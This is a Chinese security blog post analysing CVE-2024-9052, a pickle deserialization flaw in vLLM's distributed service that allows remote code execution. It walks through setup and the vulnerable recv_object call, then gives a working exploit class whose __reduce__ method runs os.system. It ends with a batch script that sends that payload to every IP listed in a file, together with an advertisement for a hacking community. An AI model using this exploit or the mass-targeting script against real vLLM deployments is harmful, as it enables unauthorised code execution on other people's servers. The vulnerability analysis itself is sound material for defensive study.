#  AI安全漏洞之VLLM反序列化漏洞分析与保姆级复现（附批量利用）   
原创 Ting丶  Ting的安全笔记   2024-12-14 02:20  
  
#WingBy小密圈知识星球简介在文末。  
# 前期准备  
  
环境需要：Linux（这里使用kali）、Anaconda  
  
首先安装Anaconda  
  
前言：最好使用linux，如果使用windows可能会产生各种报错（各种各种各种！！！），最好使用Anaconda，方便独立管理虚拟机  
  
使用conda创建虚拟机、python要求3.10  
```
conda create -n vllm_beam python=3.10 -y
```  
  
启动该虚拟机  
```
conda activate vllm_beam
```  
  
安装vllm  
```
pip3 install https://github.com/vllm-project/vllm/releases/download/v0.6.4.post1/vllm-0.6.4.post1+cu118-cp38-abi3-manylinux1_x86_64.whl --extra-index-url https://download.pytorch.org/whl/cu118 -i https://pypi.tuna.tsinghua.edu.cn/simple
```  
  
在安装vllm的时候，虚拟机磁盘剩余空间最好大点，至少6个G如果不够可能会报错  
```
No space left on device //设备上没有空间
```  
  
可以找一个有足够空间的目录  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjUdVlF6KylVvuaLCUNZ5wWnFP9VJuFSSrHCEyB7y3LEg3OjeP4w54gQ/640?wx_fmt=png&from=appmsg "")  
  
然后执行命令 就可以重新安装了  
```
export TMPDIR=/home
```  
# 漏洞介绍  
  
VLLM（  
Virtual Large Language Model  
）是一种旨在提升大型语言模型（LLM）推理效率的先进系统。其核心目标是通过降低计算成本和提升处理速度，来加快 LLM 在推理阶段的表现。传统的 LLM 推理通常需要消耗大量的计算资源和时间，特别是在硬件资源有限的环境中，性能瓶颈显得尤为突出。而 VLLM 采用了创新的架构设计，通过优化内存管理和计算流程，能够在不牺牲模型准确性的前提下，显著提高推理速度，使得推理过程变得更加高效和灵活。  
VLLM是被用于LLM推理和服务的工具库，因此与大模型密切相关  
  
CVE编号：CVE-2024-9052  
  
目前该CVE以及被保留，访问已经看不到了：  
https://nvd.nist.gov/vuln/detail/CVE-2024-9052  
，不知道具体的原因  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjXY7GjiaSdUcA0UTMSbtV8HnFeY2tFCuGec29HznXTNTy5ze16qGhTsg/640?wx_fmt=png&from=appmsg "")  
  
影响版本：（-∞, 0.6.4.post1）  
https://github.com/vllm-project/vllm/tree/main  
  
也就是说目前是直接影响的全版本、通杀  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjcl8Cep8Y5fHLIs9bfOiaUicJO9GvMcvBP5NFoNlFDKZZWmaFCoRicNiaVA/640?wx_fmt=png&from=appmsg "")  
# 漏洞原理  
  
vllm开启分布式服务时，未对接收的序列化对象进行相应的校验、过滤，导致攻击者可以向vllm分布式服务发送恶意序列化对象造成RCE  
  
漏洞方法如下  
```
vllm.distributed.GroupCoordinator.recv_object(get_world_group(), src=0)
```  
  
在recv_object方法中，使用了pickle.loads()对接收到的对象数据进行直接的反序列化 如图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjlBvO8rMS7DuL3EPfaPXMEEezibib872uL3qRWERV7qBBvN5xDSUDm1Qg/640?wx_fmt=png&from=appmsg "")  
  
pickle是python的一个进行序列化和反序列化的库，常见函数如下  
```
//序列化 将Python对象转换成json字符串
pickle.dump()
pickle.dumps()
//反序列化 将json字符串转换成Python对象
pickle.load()
pickle.loads()
```  
  
而模式方法会在一些特定的时候被执行，例如这里用到的__reduce__，使用pickle.loads()进行反序列化时，会自动调用魔术方法__reduce__，因此在该方法中直接返回执行恶意指令，造成RCE。于是构造以下恶意的类。  
```
class payload:
    def __reduce__(self):
        return (__import__('os').system, ("touch /tmp/hacked",))
```  
# 复现过程  
  
首先本地启动一个vllm分布式服务（作为攻击目标），默认端口是29500，使用recv_object方法接收客户端发送过来的对象  
```
from vllm.distributed import (ensure_model_parallel_initialized,
                              init_distributed_environment, get_world_group)
import vllm

init_distributed_environment(backend="gloo", distributed_init_method="tcp://0.0.0.0:29500", rank=1, world_size=2)
vllm.distributed.GroupCoordinator.recv_object(get_world_group(), src=0)
```  
  
忽略警告  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjjiaVV0OdVCYqqSEiaXq459AQ7FrAplfmO4jE3Wptn9CbMBRSNuDG9m7Q/640?wx_fmt=png&from=appmsg "")  
  
攻击机执行以下代码 发送恶意的序列化对象  
```
from vllm.distributed import (ensure_model_parallel_initialized,
                              init_distributed_environment, get_world_group)
import vllm

class payload:
    def __reduce__(self):
        return (__import__('os').system, ("touch 1.txt",))


init_distributed_environment(backend="gloo", distributed_init_method="tcp://127.0.0.1:29500", rank=0, world_size=2)
vllm.distributed.GroupCoordinator.send_object(get_world_group(), obj=payload(), dst=1)


```  
  
结果如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjfib2HzISjWiaUicX2icLIevTM5WVicV6nJUnlicN7vRCkpzRvRusic4TlVKgg/640?wx_fmt=png&from=appmsg "")  
  
批量漏洞利用脚步（后台回复20241213可获得）  
```
from vllm.distributed import (ensure_model_parallel_initialized,
                              init_distributed_environment, get_world_group)
import vllm

class payload:
    def __reduce__(self):
        return (__import__('os').system, ("touch CVE-2024-9052.txt",))

def getip(file_path):
    ips = []
    with open(file_path, 'r') as file:
        for line in file:
            ip = line.strip()
            if ip:
                ips.append(ip)
    return ips

ips = getip("ips.txt")
for ip in ips:
    print(ip)
    target = "tcp://" + ip
    init_distributed_environment(backend="gloo", distributed_init_method=target, rank=0, world_size=2)
    vllm.distributed.GroupCoordinator.send_object(get_world_group(), obj=payload(), dst=1)

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vfgPGEkjQibOlVy1r1mnkyIjQEic0ezbqamaOs56WV8iaia4L3AK1yZ06mXw044Wz5icpe9MkcvjtnDF1g/640?wx_fmt=png&from=appmsg "")  
  
我们的星球涵盖了红蓝攻防、企业/公益SRC、各类证书挖掘包括但不限于EDU、CNVD等、Java/PHP0Day代码审计、免杀对抗、云安全攻防、CTF、安全开发等等各个方向，还有很多高质量的文章，以及秘密工具。别的星球有的我们未必没有。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Prn4EOgO7vch3Zf5fWXcnZxyodlX736BqPicYyvX9iaibocTSONn67LKoj6JSbpWtU1wtOVrXlrvAaWGVdUUl61AQ/640?wx_fmt=png&from=appmsg "")  
  
  
